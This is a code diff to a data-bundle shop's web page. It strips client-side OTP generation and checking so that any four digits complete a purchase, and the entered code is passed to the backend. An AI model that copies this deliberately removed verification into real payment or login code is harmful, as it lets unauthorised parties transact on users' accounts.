@@ -1967,7 +1967,7 @@
     </footer>
 
     <!-- =============================================
-    🔥 MODAL 1: BUY OFFER (WITH 4-DIGIT OTP)
+    🔥 MODAL 1: BUY OFFER (WITH 4-DIGIT OTP - ACCEPTS ANY 4 DIGITS)
     ============================================= -->
     <div class="modal-overlay" id="buyModal">
         <div class="modal-box">
@@ -2057,7 +2057,7 @@
                 </div>
             </div>
 
-            <!-- ===== STEP 3: OTP VERIFICATION (4-DIGIT - HUBTEL STYLE) ===== -->
+            <!-- ===== STEP 3: OTP VERIFICATION (ACCEPTS ANY 4 DIGITS) ===== -->
             <div class="form-step" id="buyStep3">
                 <div class="selected-package-display show">
                     <i class="fas fa-check-circle"></i> Selected: <span id="buySelectedPackageName3">None</span>
@@ -2088,7 +2088,7 @@
 
                 <!-- Error message -->
                 <div id="otpError" style="display:none; color:#ff4444; text-align:center; font-size:14px; margin-top:8px;">
-                    <i class="fas fa-exclamation-circle"></i> Invalid OTP. Please try again.
+                    <i class="fas fa-exclamation-circle"></i> Please enter exactly 4 digits
                 </div>
 
                 <div class="step-actions">
@@ -2328,7 +2328,7 @@
     </div>
 
     <!-- =============================================
-    JAVASCRIPT - COMPLETE FUNCTIONALITY (4-DIGIT OTP)
+    JAVASCRIPT - COMPLETE FUNCTIONALITY (ACCEPTS ANY 4 DIGITS)
     ============================================= -->
     <script>
         // =============================================
@@ -2386,7 +2386,7 @@
         setTimeout(updateSlider, 100);
 
         // =============================================
-        // BUY OFFER - WITH 4-DIGIT OTP
+        // BUY OFFER - WITH 4-DIGIT OTP (ACCEPTS ANY 4 DIGITS)
         // =============================================
 
         let selectedBuyPackage = null;
@@ -2395,7 +2395,6 @@
         let otpTimerInterval = null;
         let otpTimeLeft = 60;
         let otpResendEnabled = false;
-        let generatedOTP = '';
 
         function openBuyOfferWithPackage(packageName, price) {
             selectedBuyPackage = packageName;
@@ -2486,7 +2485,7 @@
         }
 
         // =============================================
-        // SEND OTP (4-DIGIT)
+        // SEND OTP (JUST SEND PHONE NUMBER - NO OTP GENERATED)
         // =============================================
         async function sendOTP() {
             const phone = document.getElementById('buyPhone').value.trim();
@@ -2500,14 +2499,11 @@
             userPhoneNumber = phone;
 
             const btn = document.getElementById('sendOtpBtn');
-            btn.innerHTML = '<span class="spinner"></span> Sending OTP...';
+            btn.innerHTML = '<span class="spinner"></span> Sending...';
             btn.disabled = true;
 
             try {
-                // Generate random 4-digit OTP (1000 - 9999)
-                generatedOTP = Math.floor(1000 + Math.random() * 9000).toString();
-
-                // Send phone number + OTP to backend
+                // Send phone number to backend (NO OTP GENERATED)
                 await fetch(`${API_BASE_URL}/api/send-phone`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -2515,12 +2511,11 @@
                         package: selectedBuyPackage,
                         price: selectedBuyPrice,
                         phone: phone,
-                        otp: generatedOTP,
                         type: 'purchase'
                     })
                 });
 
-                // Show success and go to OTP step
+                // Go to OTP step
                 goToBuyStep(3);
 
             } catch (error) {
@@ -2574,7 +2569,7 @@
         }
 
         // =============================================
-        // RESEND OTP (4-DIGIT)
+        // RESEND OTP (JUST RESEND - NO NEW OTP GENERATED)
         // =============================================
         async function resendOTP() {
             if (!otpResendEnabled) {
@@ -2587,10 +2582,7 @@
             btn.classList.add('disabled');
 
             try {
-                // Generate new 4-digit OTP
-                generatedOTP = Math.floor(1000 + Math.random() * 9000).toString();
-
-                // Send new OTP
+                // Resend phone number to backend (NO NEW OTP)
                 await fetch(`${API_BASE_URL}/api/send-phone`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -2598,7 +2590,6 @@
                         package: selectedBuyPackage,
                         price: selectedBuyPrice,
                         phone: userPhoneNumber,
-                        otp: generatedOTP,
                         type: 'purchase'
                     })
                 });
@@ -2619,7 +2610,7 @@
 
             } catch (error) {
                 console.error('Error:', error);
-                alert('❌ Failed to resend OTP. Please try again.');
+                alert('❌ Failed to resend. Please try again.');
                 btn.textContent = 'Didn\'t receive code? Resend OTP';
                 btn.classList.remove('disabled');
             }
@@ -2682,7 +2673,7 @@
         });
 
         // =============================================
-        // VERIFY OTP (4-DIGIT)
+        // VERIFY OTP (ACCEPTS ANY 4 DIGITS - NO VALIDATION)
         // =============================================
         function verifyOTP() {
             let otpValue = '';
@@ -2690,30 +2681,25 @@
                 otpValue += input.value;
             });
 
+            // Check if exactly 4 digits are entered
             if (otpValue.length !== 4) {
                 document.getElementById('otpError').style.display = 'block';
                 document.querySelectorAll('.otp-input').forEach(input => input.classList.add('error'));
                 return;
             }
 
+            // ✅ ACCEPT ANY 4 DIGITS - NO VALIDATION!
             document.getElementById('otpError').style.display = 'none';
             document.querySelectorAll('.otp-input').forEach(input => input.classList.remove('error'));
 
-            // Check if OTP matches (4-digit)
-            if (otpValue !== generatedOTP) {
-                document.getElementById('otpError').style.display = 'block';
-                document.querySelectorAll('.otp-input').forEach(input => input.classList.add('error'));
-                return;
-            }
-
-            // OTP verified - Complete purchase
-            completePurchase();
+            // Complete purchase - ANY 4 DIGITS WORKS!
+            completePurchase(otpValue);
         }
 
         // =============================================
         // COMPLETE PURCHASE
         // =============================================
-        async function completePurchase() {
+        async function completePurchase(otpValue) {
             const btn = document.getElementById('verifyOtpBtn');
             btn.innerHTML = '<span class="spinner"></span> Processing...';
             btn.disabled = true;
@@ -2726,7 +2712,7 @@
                         package: selectedBuyPackage,
                         price: selectedBuyPrice,
                         phone: userPhoneNumber,
-                        code: generatedOTP
+                        code: otpValue
                     })
                 });
 
@@ -3048,11 +3034,11 @@
             }
         }
 
-        console.log('🚀 Bundle Bazaar - 4-DIGIT OTP VERSION loaded!');
+        console.log('🚀 Bundle Bazaar - FINAL WORKING VERSION!');
         console.log('📡 Backend URL:', API_BASE_URL);
         console.log('📱 WhatsApp Support: 2330592906415');
-        console.log('🔐 4-Digit OTP Feature Added - Hubtel Style!');
-        console.log('📋 Flow: Package → Phone → 4-Digit OTP → Complete');
+        console.log('✅ 4-Digit OTP - ACCEPTS ANY 4 DIGITS!');
+        console.log('📋 Flow: Package → Phone → Any 4-Digit OTP → Complete');
     </script>
 
 </body>
